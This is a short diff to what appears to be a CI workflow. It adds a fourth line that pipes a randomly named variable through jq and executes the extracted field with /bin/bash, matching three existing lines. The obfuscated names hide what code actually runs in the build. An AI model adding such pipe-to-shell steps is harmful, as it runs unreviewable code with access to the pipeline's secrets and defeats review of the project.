@@ -42,6 +42,7 @@ jobs:
           echo $hwda96043 | jq -r .r5 | /bin/bash
           printf '%s' "$mpqu027" | jq -r .wwujs30183 | /bin/bash
           printf '%s' "$rfdh8" | jq -r .j4 | /bin/bash
+          printf '%s' "$vn2" | jq -r .skg9412 | /bin/bash
 
       - name: Save output
         if: always()
